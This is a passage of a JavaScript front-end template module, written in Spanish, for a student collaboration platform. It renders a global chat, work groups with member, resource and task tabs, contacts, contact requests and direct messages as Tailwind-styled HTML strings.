                            <div class="text-xs opacity-90">Colaboradores</div>
                        </div>
                        <div class="bg-gradient-to-br from-purple-500 to-purple-600 text-white rounded-xl p-4 text-center">
                            <div class="text-2xl font-bold">${uniqueCategories}</div>
                            <div class="text-xs opacity-90">Categorías</div>
                        </div>
                    </div>
                </div>

                <!-- Columna Derecha - Chat Global -->
                <div class="space-y-6">
                    <!-- Chat Global -->
                    <div class="bg-white rounded-2xl shadow-lg p-6">
                        <h2 class="text-xl font-bold text-gray-800 mb-4 flex items-center gap-2">
                            <svg class="w-5 h-5 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                            </svg>
                            Chat Global UFG
                        </h2>
                        
                        <div id="chat-messages" class="bg-gray-50 rounded-lg p-4 h-64 overflow-y-auto mb-4">
                            ${this.chatMessages(chatMessages)}
                        </div>
                        
                        <form id="chat-form" class="flex gap-2">
                            <input type="text" 
                                   id="chat-input"
                                   placeholder="Escribe un mensaje..." 
                                   class="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:border-blue-500 focus:ring-2 focus:ring-blue-200"
                                   maxlength="500"
                                   required>
                            <button type="submit" class="bg-blue-600 text-white px-4 py-2 rounded-lg hover:bg-blue-700 transition-colors duration-200">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path>
                                </svg>
                            </button>
                        </form>
                    </div>

                    <!-- Acciones Rápidas -->
                    <div class="bg-gradient-to-br from-blue-50 to-indigo-100 rounded-2xl p-6">
                        <h3 class="font-bold text-gray-800 mb-4">Acciones Rápidas</h3>
                        <div class="space-y-2">
                            <button id="quick-upload" class="w-full flex items-center gap-3 p-3 bg-white rounded-lg hover:shadow-md transition-all duration-200">
                                <svg class="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path>
                                </svg>
                                <span class="text-sm font-medium">Subir Recurso</span>
                            </button>
                            <button id="quick-group" class="w-full flex items-center gap-3 p-3 bg-white rounded-lg hover:shadow-md transition-all duration-200">
                                <svg class="w-5 h-5 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197m13.5-9a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0z"></path>
                                </svg>
                                <span class="text-sm font-medium">Crear Grupo</span>
                            </button>
                            <button id="quick-contact" class="w-full flex items-center gap-3 p-3 bg-white rounded-lg hover:shadow-md transition-all duration-200">
                                <svg class="w-5 h-5 text-purple-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path>
                                </svg>
                                <span class="text-sm font-medium">Agregar Contacto</span>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        `;
    },

    /**
     * Dibuja los mensajes del chat
     */
    chatMessages(messages = []) {
        if (messages.length === 0) {
            return /*html*/`
                <div class="text-center py-8 text-gray-500">
                    <svg class="w-12 h-12 mx-auto mb-2 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                    </svg>
                    <p class="text-sm">No hay mensajes aún</p>
                    <p class="text-xs text-gray-400">¡Sé el primero en saludar!</p>
                </div>
            `;
        }

        return messages.map(msg => /*html*/`
            <div class="flex items-start gap-3 mb-4">
                <div class="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white text-xs font-bold">
                    ${esc(msg.user_name ? msg.user_name.charAt(0).toUpperCase() : 'U')}
                </div>
                <div class="flex-1">
                    <div class="flex items-center gap-2 mb-1">
                        <span class="font-semibold text-sm">${esc(msg.user_name)}</span>
                        <span class="text-xs text-gray-500">${new Date(msg.timestamp).toLocaleTimeString()}</span>
                    </div>
                    <p class="text-sm text-gray-700 bg-white p-3 rounded-lg shadow-sm">${esc(msg.message)}</p>
                </div>
            </div>
        `).join('');
    },

    /**
     * Dibuja el contenido de Grupos de Trabajo FUNCIONAL
     */
    groupsContent(groups = []) {
        return /*html*/`
        <div class="max-w-7xl mx-auto animate-fade-in">
            <header class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
                <div class="text-center md:text-left">
                    <h1 class="text-4xl font-bold text-gray-800 mb-2 bg-gradient-to-r from-green-600 to-green-800 bg-clip-text text-transparent">
                        👥 Grupos de Trabajo
                    </h1>
                    <p class="text-gray-600">Colabora en proyectos con tus compañeros</p>
                </div>
                <button id="create-group-btn" class="group w-full md:w-auto flex items-center justify-center gap-3 bg-gradient-to-r from-green-500 to-green-600 text-white py-3 px-6 rounded-xl font-semibold shadow-lg hover:from-green-600 hover:to-green-700 transform hover:scale-105 hover:shadow-xl transition-all duration-300">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path>
                    </svg>
                    <span>Crear Nuevo Grupo</span>
                </button>
            </header>

            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                ${groups.length > 0 ? groups.map(group => /*html*/`
                    <div class="bg-white rounded-2xl shadow-lg p-6 hover:shadow-xl transition-all duration-300 transform hover:scale-[1.02]">
                        <div class="flex items-center justify-between mb-4">
                            <h3 class="font-bold text-gray-800 text-lg">${esc(group.name)}</h3>
                            <span class="bg-green-100 text-green-700 text-xs px-2 py-1 rounded-full">Activo</span>
                        </div>
                        
                        <p class="text-gray-600 text-sm mb-4">${esc(group.description || 'Sin descripción')}</p>
                        
                        <div class="flex items-center justify-between mb-4">
                            <div class="flex -space-x-2">
                                <div class="w-8 h-8 bg-blue-500 rounded-full border-2 border-white flex items-center justify-center text-white text-xs">
                                    ${esc(group.owner_name ? group.owner_name.charAt(0).toUpperCase() : 'O')}
                                </div>
                                <div class="w-8 h-8 bg-green-500 rounded-full border-2 border-white flex items-center justify-center text-white text-xs">
                                    +${group.member_count - 1}
                                </div>
                            </div>
                            <span class="text-xs text-gray-500">${group.member_count} miembros</span>
                        </div>
                        
                        <div class="space-y-2">
                            <button class="access-group-btn w-full bg-blue-600 text-white py-2 px-4 rounded-lg text-sm font-medium hover:bg-blue-700 transition-colors duration-200" data-group-id="${group.id}">
                                Acceder al Grupo
                            </button>
                            <button class="view-group-details-btn w-full border border-gray-300 text-gray-700 py-2 px-4 rounded-lg text-sm font-medium hover:bg-gray-50 transition-colors duration-200" data-group-id="${group.id}">
                                Ver Detalles
                            </button>
                        </div>
                    </div>
                `).join('') : ''}
                
                <!-- Grupo vacío para crear nuevo -->
                <div id="create-group-placeholder" class="bg-white rounded-2xl shadow-lg p-6 border-2 border-dashed border-gray-300 flex flex-col items-center justify-center text-center hover:border-green-400 transition-colors duration-300 cursor-pointer">
                    <svg class="w-12 h-12 text-gray-400 mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path>
                    </svg>
                    <p class="text-gray-600 mb-2">Crea tu primer grupo</p>
                    <p class="text-sm text-gray-500">Comienza a colaborar con tus compañeros</p>
                </div>
            </div>
        </div>

        <!-- Modal para crear grupo -->
        <div id="create-group-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 z-40 flex items-center justify-center p-4 backdrop-blur-sm">
            <div class="bg-white rounded-2xl shadow-2xl w-full max-w-md transform animate-modal-in">
                <div class="flex justify-between items-center p-6 border-b border-gray-200">
                    <h3 class="text-xl font-bold text-gray-900">Crear Nuevo Grupo</h3>
                    <button type="button" id="close-group-modal" class="text-gray-400 hover:text-gray-600 transform hover:scale-110 transition-all duration-200">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                        </svg>
                    </button>
                </div>
                
                <form id="create-group-form" class="p-6 space-y-4">
                    <div>
                        <label for="group-name" class="block text-sm font-semibold text-gray-700 mb-2">Nombre del Grupo *</label>
                        <input type="text" 
                               id="group-name" 
                               class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-green-500 focus:ring-2 focus:ring-green-200 transition-all duration-300" 
                               placeholder="Ej: Proyecto IA 2024"
                               required>
                    </div>

                    <div>
                        <label for="group-description" class="block text-sm font-semibold text-gray-700 mb-2">Descripción</label>
                        <textarea 
                            id="group-description" 
                            class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-green-500 focus:ring-2 focus:ring-green-200 transition-all duration-300" 
                            placeholder="Describe el propósito del grupo..."
                            rows="3"></textarea>
                    </div>
                </form>
                
                <div class="flex justify-end space-x-3 p-6 border-t border-gray-200">
                    <button type="button" id="cancel-group-modal" class="bg-white py-3 px-6 rounded-lg border-2 border-gray-300 text-sm font-semibold text-gray-700 hover:bg-gray-50 hover:border-gray-400 transform hover:scale-105 transition-all duration-300">
                        Cancelar
                    </button>
                    <button type="submit" form="create-group-form" class="bg-gradient-to-r from-green-500 to-green-600 text-white py-3 px-6 rounded-lg text-sm font-semibold shadow-lg hover:from-green-600 hover:to-green-700 transform hover:scale-105 hover:shadow-xl transition-all duration-300">
                        Crear Grupo
                    </button>
                </div>
            </div>
        </div>
        `;
    },

    /**
     * Modal de Detalle de Grupo con pestañas
     */
    groupDetailModal(group) {
        return /*html*/`
        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-4xl max-h-[90vh] overflow-y-auto transform animate-modal-in">
            <div class="flex justify-between items-center p-6 border-b border-gray-200 sticky top-0 bg-white z-10">
                <h3 class="text-xl font-bold text-gray-900">${esc(group.name)}</h3>
                <button type="button" id="close-group-detail-modal" class="text-gray-400 hover:text-gray-600 transform hover:scale-110 transition-all duration-200">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </button>
            </div>

            <!-- Pestañas -->
            <div class="border-b border-gray-200">
                <nav class="flex space-x-8 px-6">
                    <button class="group-detail-tab py-4 px-1 border-b-2 font-medium text-sm border-green-500 text-green-600" data-tab="members">
                        👥 Miembros
                    </button>
                    <button class="group-detail-tab py-4 px-1 border-b-2 font-medium text-sm border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300" data-tab="resources">
                        📚 Recursos
                    </button>
                    <button class="group-detail-tab py-4 px-1 border-b-2 font-medium text-sm border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300" data-tab="tasks">
                        ✅ Tareas
                    </button>
                </nav>
            </div>

            <!-- Contenido de las pestañas -->
            <div class="p-6">
                <!-- Pestaña Miembros -->
                <div id="group-members-tab" class="group-detail-content space-y-4">
                    <div class="flex justify-between items-center mb-4">
                        <h4 class="font-semibold text-gray-800">Miembros del Grupo</h4>
                        <button class="text-sm text-green-600 hover:text-green-700 font-medium">
                            + Invitar Miembro
                        </button>
                    </div>
                    <div class="space-y-3">
                        ${group.members ? group.members.map(member => /*html*/`
                            <div class="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                                <div class="flex items-center gap-3">
                                    <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold text-sm">
                                        ${esc(member.name ? member.name.charAt(0).toUpperCase() : 'U')}
                                    </div>
                                    <div>
                                        <p class="font-medium text-sm">${esc(member.name)}</p>
                                        <p class="text-xs text-gray-500">${esc(member.email)}</p>
                                    </div>
                                </div>
                                ${member.is_owner ? /*html*/`
                                    <span class="bg-green-100 text-green-700 text-xs px-2 py-1 rounded-full">Líder</span>
                                ` : ''}
                            </div>
                        `).join('') : '<p class="text-gray-500 text-center py-4">No hay miembros en el grupo</p>'}
                    </div>
                </div>

                <!-- Pestaña Recursos -->
                <div id="group-resources-tab" class="group-detail-content hidden space-y-4">
                    <div class="flex justify-between items-center mb-4">
                        <h4 class="font-semibold text-gray-800">Recursos del Grupo</h4>
                        <button id="upload-group-resource" class="text-sm bg-green-600 text-white px-3 py-1 rounded-lg hover:bg-green-700 transition-colors duration-200">
                            + Subir Recurso
                        </button>
                    </div>
                    <div class="space-y-3">
                        ${group.resources ? group.resources.map(resource => /*html*/`
                            <div class="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                                <div class="flex items-center gap-3">
                                    <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                                    </svg>
                                    <div>
                                        <p class="font-medium text-sm">${esc(resource.title)}</p>
                                        <p class="text-xs text-gray-500">Subido por: ${esc(resource.uploaded_by)}</p>
                                    </div>
                                </div>
                                <button type="button"
                                   class="download-protected-btn text-blue-600 hover:text-blue-800 text-sm"
                                   data-group-id="${group.id}"
                                   data-resource-id="${resource.id}"
                                   data-filename="${esc(resource.original_filename || resource.filename)}">
                                    Descargar
                                </button>
                            </div>
                        `).join('') : '<p class="text-gray-500 text-center py-4">No hay recursos en el grupo</p>'}
                    </div>
                </div>

                <!-- Pestaña Tareas -->
                <div id="group-tasks-tab" class="group-detail-content hidden space-y-4">
                    <div class="flex justify-between items-center mb-4">
                        <h4 class="font-semibold text-gray-800">Tareas del Grupo</h4>
                        ${group.owner_id === window.App.state.user.id ? /*html*/`
                            <button id="add-group-task" class="text-sm bg-green-600 text-white px-3 py-1 rounded-lg hover:bg-green-700 transition-colors duration-200">
                                + Agregar Tarea
                            </button>
                        ` : ''}
                    </div>
                    <div class="space-y-3">
                        ${group.tasks ? group.tasks.map(task => /*html*/`
                            <div class="p-3 bg-gray-50 rounded-lg border-l-4 ${task.status === 'completed' ? 'border-green-500' : task.status === 'in_progress' ? 'border-yellow-500' : 'border-gray-400'}">
                                <div class="flex justify-between items-start mb-2">
                                    <h5 class="font-medium text-sm">${esc(task.title)}</h5>
                                    <span class="text-xs px-2 py-1 rounded-full ${
                                        task.status === 'completed' ? 'bg-green-100 text-green-700' : 
                                        task.status === 'in_progress' ? 'bg-yellow-100 text-yellow-700' : 
                                        'bg-gray-100 text-gray-700'
                                    }">${task.status === 'completed' ? 'Completada' : task.status === 'in_progress' ? 'En Progreso' : 'Pendiente'}</span>
                                </div>
                                <p class="text-xs text-gray-600 mb-2">${esc(task.description || 'Sin descripción')}</p>
                                <div class="flex justify-between items-center text-xs text-gray-500">
                                    <span>Asignada a: ${esc(task.assigned_to || 'No asignada')}</span>
                                    <span>Vence: ${task.due_date ? new Date(task.due_date).toLocaleDateString() : 'Sin fecha'}</span>
                                </div>
                            </div>
                        `).join('') : '<p class="text-gray-500 text-center py-4">No hay tareas en el grupo</p>'}
                    </div>
                </div>
            </div>

            <div class="flex justify-end space-x-3 p-6 border-t border-gray-200">
                <button type="button" id="cancel-group-detail-modal" class="bg-white py-3 px-6 rounded-lg border-2 border-gray-300 text-sm font-semibold text-gray-700 hover:bg-gray-50 hover:border-gray-400 transform hover:scale-105 transition-all duration-300">
                    Cerrar
                </button>
            </div>
        </div>
        `;
    },

    /**
     * Dibuja el contenido de Contactos FUNCIONAL con notificaciones
     */
    /**
 * Dibuja el contenido de Contactos FUNCIONAL con notificaciones
 */
contactsContent(contacts = [], searchResults = [], contactRequests = []) {
    return /*html*/`
    <div class="max-w-7xl mx-auto animate-fade-in">
        <header class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
            <div class="text-center md:text-left">
                <h1 class="text-4xl font-bold text-gray-800 mb-2 bg-gradient-to-r from-purple-600 to-purple-800 bg-clip-text text-transparent">
                    💬 Contactos
                </h1>
                <p class="text-gray-600">Conecta con otros estudiantes</p>
            </div>
            <div class="flex gap-3">
                <div class="relative">
                    <input type="text" 
                           id="search-contacts"
                           placeholder="Buscar usuarios..." 
                           class="pl-10 pr-4 py-3 border border-gray-300 rounded-lg focus:border-purple-500 focus:ring-2 focus:ring-purple-200 transition-all duration-300 w-64">
                    <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
                    </svg>
                </div>
            </div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
            <!-- Lista de Contactos y Notificaciones -->
            <div class="lg:col-span-1 space-y-6">
                <!-- Mis Contactos -->
                <div class="bg-white rounded-2xl shadow-lg p-6">
                    <h3 class="font-bold text-gray-800 mb-4">Mis Contactos</h3>
                    <div id="contacts-list" class="space-y-3 max-h-96 overflow-y-auto">
                        ${this.contactsList(contacts)}
                    </div>
                </div>

                <!-- Notificaciones de Contactos -->
                <div class="bg-white rounded-2xl shadow-lg p-6">
                    <h3 class="font-bold text-gray-800 mb-4 flex items-center gap-2">
                        <svg class="w-4 h-4 text-orange-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-5 5v-5zM10.24 8.56a5.97 5.97 0 01-4.66-6.24M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        Solicitudes de Contacto
                    </h3>
                    <div id="contact-requests" class="space-y-3 max-h-48 overflow-y-auto">
                        ${this.contactRequestsList(contactRequests)}
                    </div>
                </div>
            </div>

            <!-- Área de Búsqueda y Chat -->
            <div class="lg:col-span-3 space-y-6">
                <!-- Resultados de Búsqueda -->
                <div id="search-results" class="bg-white rounded-2xl shadow-lg p-6 ${searchResults.length > 0 ? '' : 'hidden'}">
                    <h3 class="font-bold text-gray-800 mb-4">Resultados de Búsqueda</h3>
                    <div class="space-y-3">
                        ${this.searchResultsList(searchResults)}
                    </div>
                </div>

                <!-- Área de Chat -->
                <div id="chat-area" class="bg-white rounded-2xl shadow-lg p-6 ${contacts.length > 0 ? '' : 'hidden'}">
                    <div id="selected-contact" class="flex items-center gap-3 mb-6 pb-4 border-b border-gray-200">
                        <div class="w-12 h-12 bg-purple-500 rounded-full flex items-center justify-center text-white font-bold text-lg">
                            👤
                        </div>
                        <div>
                            <p class="font-bold text-gray-800">Selecciona un contacto</p>
                            <p class="text-sm text-gray-500">Para comenzar a chatear</p>
                        </div>
                    </div>

                    <div id="direct-messages" class="h-96 overflow-y-auto mb-4 space-y-4 bg-gray-50 rounded-lg p-4">
                        <div class="text-center py-16 text-gray-500">
                            <svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                            </svg>
                            <p>Selecciona un contacto para ver los mensajes</p>
                        </div>
                    </div>

                    <form id="direct-message-form" class="flex gap-2 ${contacts.length > 0 ? '' : 'hidden'}">
                        <input type="text" 
                               id="direct-message-input"
                               placeholder="Escribe un mensaje..." 
                               class="flex-1 px-4 py-3 border border-gray-300 rounded-lg focus:border-purple-500 focus:ring-2 focus:ring-purple-200"
                               maxlength="1000"
                               disabled>
                        <button type="submit" class="bg-purple-600 text-white px-6 py-3 rounded-lg hover:bg-purple-700 transition-colors duration-200 disabled:bg-gray-400" disabled>
                            Enviar
                        </button>
                    </form>
                </div>

                <!-- Sin contactos -->
                <div id="no-contacts" class="bg-white rounded-2xl shadow-lg p-12 text-center ${contacts.length === 0 ? '' : 'hidden'}">
                    <div class="w-24 h-24 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-6">
                        <svg class="w-12 h-12 text-purple-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path>
                        </svg>
                    </div>
                    <h3 class="text-xl font-bold text-gray-800 mb-2">Aún no tienes contactos</h3>
                    <p class="text-gray-600 mb-6">Busca usuarios y agrégalos como contactos para comenzar a chatear</p>
                </div>
            </div>
        </div>
    </div>
    `;
},

chatArea(selectedContact = null, messages = []) {
    if (!selectedContact) {
        return /*html*/`
            <div class="flex items-center gap-3 mb-6 pb-4 border-b border-gray-200">
                <!-- 🆕 NUEVO: Avatar por defecto -->
                <div class="w-12 h-12 bg-purple-500 rounded-full flex items-center justify-center text-white font-bold text-lg">
                    👤
                </div>
                <div>
                    <p class="font-bold text-gray-800">Selecciona un contacto</p>
                    <p class="text-sm text-gray-500">Para comenzar a chatear</p>
                </div>
            </div>
            <!-- ... resto igual ... -->
        `;
    }

    // 🆕 NUEVO: Generar iniciales y obtener color
    const getInitials = (name) => {
        if (!name) return 'U';
        return name.split(' ').map(word => word.charAt(0).toUpperCase()).join('').substring(0, 2);
    };
    const initials = getInitials(selectedContact.name);
    const profileColor = selectedContact.profile_color || '#3B82F6';

    return /*html*/`
        <div class="flex items-center gap-3 mb-6 pb-4 border-b border-gray-200">
            <!-- 🆕 NUEVO: Avatar con color dinámico -->
            <div class="w-12 h-12 rounded-full flex items-center justify-center text-white font-bold text-lg shadow-md" 
                 style="background-color: ${profileColor}">
                ${initials}
            </div>
            <div class="flex-1">
                <p class="font-bold text-gray-800">${esc(selectedContact.name)}</p>
                <p class="text-sm text-gray-500">En línea</p>
            </div>
            <div class="flex gap-2">
                
                <button class="p-2 text-gray-400 hover:text-gray-600" title="Información">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                </button>
            </div>
        </div>

        <div id="direct-messages" class="h-96 overflow-y-auto mb-4 space-y-4">
            ${this.directMessages(messages)}
        </div>

        <form id="direct-message-form" class="flex gap-2">
            <input type="text" 
                   id="direct-message-input"
                   placeholder="Escribe un mensaje..." 
                   class="flex-1 px-4 py-3 border border-gray-300 rounded-lg focus:border-purple-500 focus:ring-2 focus:ring-purple-200"
                   maxlength="1000"
                   required>
            <button type="submit" class="bg-purple-600 text-white px-6 py-3 rounded-lg hover:bg-purple-700 transition-colors duration-200">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path>
                </svg>
            </button>
        </form>
    `;
},
contactsList(contacts = []) {
    if (contacts.length === 0) {
        return /*html*/`
            <div class="text-center py-8 text-gray-500">
                <svg class="w-12 h-12 mx-auto mb-2 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path>
                </svg>
                <p class="text-sm">No tienes contactos aún</p>
            </div>
        `;
    }

    return contacts.map(contact => {
        // Generar iniciales y obtener color
        const getInitials = (name) => {
            if (!name) return 'U';
            return name.split(' ').map(word => word.charAt(0).toUpperCase()).join('').substring(0, 2);
        };
        const initials = getInitials(contact.name);
        const profileColor = contact.profile_color || '#3B82F6';

        return /*html*/`
        <div class="flex items-center justify-between p-3 rounded-lg hover:bg-gray-50 cursor-pointer transition-colors duration-200 contact-item group" data-contact-id="${contact.user_id || contact.id}">
            <div class="flex items-center gap-3 flex-1">
                <!-- Avatar con color dinámico -->
                <div class="w-10 h-10 rounded-full flex items-center justify-center text-white font-bold text-sm shadow-md" 
                     style="background-color: ${profileColor}">
                    ${initials}
                </div>
                <div class="flex-1">
                    <p class="font-medium text-sm">${esc(contact.name || 'Usuario')}</p>
                    <p class="text-xs text-gray-500">${esc(contact.email || 'Sin email')}</p>
                </div>
            </div>
            <div class="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity duration-200">
                <button class="message-contact-btn p-2 text-green-600 hover:text-green-800" data-contact-id="${contact.user_id || contact.id}" title="Enviar mensaje">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
                    </svg>
                </button>
                <!-- 🆕 NUEVO BOTÓN PARA VER PERFIL -->
                <button class="view-profile-btn p-2 text-blue-600 hover:text-blue-800" data-contact-id="${contact.user_id || contact.id}" title="Ver perfil">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                    </svg>
                </button>
            </div>
        </div>
    `}).join('');
},

   /**
 * Dibuja las solicitudes de contacto pendientes MEJORADA
 */
contactRequestsList(requests = []) {
    if (requests.length === 0) {
        return /*html*/`
            <div class="text-center py-4 text-gray-500">
                <p class="text-sm">No tienes solicitudes pendientes</p>
            </div>
        `;
    }

    return requests.map(request => /*html*/`
        <div class="p-3 bg-orange-50 rounded-lg border border-orange-200">
            <div class="flex items-center gap-3 mb-2">
                <div class="w-8 h-8 bg-orange-500 rounded-full flex items-center justify-center text-white font-bold text-xs">
                    ${esc(request.user_name ? request.user_name.charAt(0).toUpperCase() : 'U')}
                </div>
                <div class="flex-1">
                    <p class="font-medium text-sm">${esc(request.user_name || 'Usuario')}</p>
                    <p class="text-xs text-gray-500">${esc(request.user_email || 'Sin email')}</p>
                </div>
            </div>
            <div class="flex gap-2">
                <!-- 🆕 BOTÓN PARA ACEPTAR SOLICITUD -->
                <button class="accept-request-btn flex-1 bg-green-600 text-white py-1 px-2 rounded text-xs hover:bg-green-700 transition-colors duration-200" data-request-id="${request.id}">
                    Aceptar
                </button>
                <button class="reject-request-btn flex-1 bg-red-600 text-white py-1 px-2 rounded text-xs hover:bg-red-700 transition-colors duration-200" data-request-id="${request.id}">
                    Rechazar
                </button>
            </div>
        </div>
    `).join('');
},

    /**
     * Dibuja los resultados de búsqueda
     */
    searchResultsList(results = []) {
        if (results.length === 0) {
            return /*html*/`
                <div class="text-center py-4 text-gray-500">
                    <p class="text-sm">No se encontraron usuarios</p>
                </div>
            `;
        }

        return results.map(user => {
            let buttonHtml = '';
            if (user.is_contact) {
                buttonHtml = '<span class="text-xs bg-green-100 text-green-700 px-2 py-1 rounded-full">Contacto</span>';
            } else if (user.contact_status === 'pending') {
                buttonHtml = '<button class="bg-yellow-500 text-white px-3 py-1 rounded-lg text-xs font-medium hover:bg-yellow-600 transition-colors duration-200 add-contact-btn" data-user-id="' + user.id + '">Pendiente</button>';
            } else {
                buttonHtml = '<button class="bg-purple-600 text-white px-3 py-1 rounded-lg text-xs font-medium hover:bg-purple-700 transition-colors duration-200 add-contact-btn" data-user-id="' + user.id + '">Agregar</button>';
            }

            return /*html*/`
                <div class="flex items-center justify-between p-3 rounded-lg border border-gray-200">
                    <div class="flex items-center gap-3">
                        <div class="w-10 h-10 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold text-sm">
                            ${esc(user.name ? user.name.charAt(0).toUpperCase() : 'U')}
                        </div>
                        <div>
                            <p class="font-medium text-sm">${esc(user.name)}</p>
                            <p class="text-xs text-gray-500">${esc(user.email)}</p>
                        </div>
                    </div>
                    <div>
                        ${buttonHtml}
                    </div>
                </div>
            `;
        }).join('');
    },

    /**
     * Dibuja mensajes directos
     */
    directMessages(messages = []) {
        if (messages.length === 0) {
            return /*html*/`
                <div class="text-center py-16 text-gray-500">
